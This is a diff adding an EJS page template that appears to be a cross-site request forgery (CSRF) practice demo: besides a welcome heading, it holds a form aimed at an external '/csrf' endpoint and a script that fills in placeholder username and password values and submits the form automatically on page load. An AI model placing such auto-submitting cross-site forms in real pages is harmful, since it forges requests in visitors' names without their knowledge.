@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title><%= title %></title>
+    <link rel='stylesheet' href='/stylesheets/style.css' />
+</head>
+<body>
+<h1><%= title %></h1>
+<p>Welcome to <%= title %></p>
+
+<!--http://localhost:4000/users/csrf-->
+
+<form action="http://www.baidu.com/csrf" id="postMessage" method="post">
+    <input type="text" name="" value="ssssssss" />
+    <input type="text" name="" value="ddddddddddddssssssss" />
+</form>
+<script>
+    var f=document.getElementById("postMessage");
+    f.elements[0].value = "testtest";
+    f.elements[1].value = "passwordddd";
+    f.submit();
+</script>
+
+</body>
+</html>
